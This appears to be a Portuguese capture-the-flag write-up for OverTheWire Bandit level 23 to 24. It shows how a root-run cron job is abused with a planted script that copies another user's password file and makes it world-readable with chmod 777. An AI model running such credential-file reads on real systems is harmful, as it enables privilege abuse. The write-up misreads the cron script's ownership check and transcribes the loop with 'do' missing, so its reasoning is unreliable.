# Nível 23 - 24 (OverTheWire: Bandit)

### 📌 Descrição do Desafio

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

---

### 🎯 Objetivo

Devemos explorar e identificar os arquvios de /etc/cron.d/, depois, criaremos nosso próprio script.

---


### 🔍 Passo a Passo da Lógica

* Ao entrar no servidor, entrei novamente em /etc/cron.d/, lendo agora o arquivo cronjob_bandit24:

```
bandit23@bandit:/etc/cron.d$ strings cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
* Mais uma vez localizei um arquivo .sh:

```
bandit23@bandit:/etc/cron.d$ strings /usr/bin/cronjob_bandit24.sh
#!/bin/bash
myname=$(whoami)
cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

* Interpretando o arquivo, entende-se que ele executa e deleta todos os arquivos do diretório `/var/spool/bandit24/foo` depois de 60 segundos, porém ele não executa os arquivos do usuário bandit23.

* O que fazer então? Criar um .sh que pegue a senha do próximo nível e copiar para o diretório `/var/spool/bandit24/foo`.

* Para criar o arquivo, loguei no usuário bandit22 (para burlar a exceção do bandit23) e criei um diretório temporário (porque não tenho permissão de criar em outros locais):

```
bandit22@bandit:~$ mktemp -d
/tmp/tmp.0Y4sAieIkR
bandit22@bandit:~$ cd /tmp/tmp.0Y4sAieIkR
```

* Para criar o arquivo usei o nano e escrevi seguinte código:

```
bandit22@bandit:/tmp/tmp.0Y4sAieIkR$ nano script.sh

#!/bin/bash
cp /etc/bandit_pass/bandit24 /tmp/tmp.0Y4sAieIkR/
```

* Assim, ele vai copiar o arquivo de senha para o diretório temporário.
* Olhando o arquivo com ls -la, vemos que realmente está com o nome do usuário bandit22:

```
-rwxrwxr-x    1 bandit22 bandit22     70 Nov 27 16:45 script.sh
```

* Para copiar o arquivo para o diretório desejado, criei outra conexão, agora com o usuário bandit23, e copiei:

```
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.0Y4sAieIkR
bandit23@bandit:/tmp/tmp.0Y4sAieIkR$ cp script.sh /var/spool/bandit24/foo/script.sh
```

* Após 60 segundos, verfiquei o diretório temporário:

```
bandit23@bandit:/tmp/tmp.0Y4sAieIkR$ ls
bandit24  script.sh
```

* Mas ainda não pude cantar vitória, porque não possuia permissão de abrir o arquivo:

```
bandit23@bandit:/tmp/tmp.0Y4sAieIkR$ cat bandit24
cat: bandit24: Permission denied
```

* Tive que criar então outro arquivo com o bandit22, alterando o nível de permissão do arquivo no diretório temporário:

```
#!/bin/bash
chmod 777 /tmp/tmp.0Y4sAieIkR/bandit24
```

* Copiei novamente como bandit23, esperei 60 segundos e pronto, acesso liberado para qualquer usuário.

---

### ✔️ Resultado Final

Ao acessar o arquivo, a senha do usuário do próximo nível é revelada.

---

### 📚 Aprendizados do Nível

Aprendemos muita coisa nesse nível, desde análise e criação de shell-script até pensar fora da caixinha para lidar com níveis de permissão de arquivos.

---

## 🔗 Próximo Nível

[Ir para o próximo nível](../24%20(Level%2024%20-%2025)/readme.md)